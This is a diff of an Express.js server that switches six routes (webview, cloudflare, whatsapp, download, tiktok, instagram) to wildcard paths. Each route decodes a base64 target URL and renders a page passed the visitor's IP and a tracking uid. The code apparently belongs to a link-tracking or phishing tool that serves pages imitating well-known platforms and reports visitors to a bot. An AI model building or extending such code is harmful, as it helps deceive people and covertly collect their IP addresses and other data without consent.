@@ -263,12 +263,12 @@ async function handleLinkOpen(req, res, view) {
   res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat });
 }
 
-app.get("/w/:path/:uri",  (req, res) => handleLinkOpen(req, res, "webview"));
-app.get("/c/:path/:uri",  (req, res) => handleLinkOpen(req, res, "cloudflare"));
-app.get("/wa/:path/:uri", (req, res) => handleLinkOpen(req, res, "whatsapp"));
-app.get("/dl/:path/:uri", (req, res) => handleLinkOpen(req, res, "download"));
-app.get("/tt/:path/:uri", (req, res) => handleLinkOpen(req, res, "tiktok"));
-app.get("/ig/:path/:uri", (req, res) => handleLinkOpen(req, res, "instagram"));
+app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
+app.get("/c/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "cloudflare"); });
+app.get("/wa/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "whatsapp"); });
+app.get("/dl/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "download"); });
+app.get("/tt/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "tiktok"); });
+app.get("/ig/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "instagram"); });
 
 // ── Bot Logic ─────────────────────────────────────────────────────────────────
 
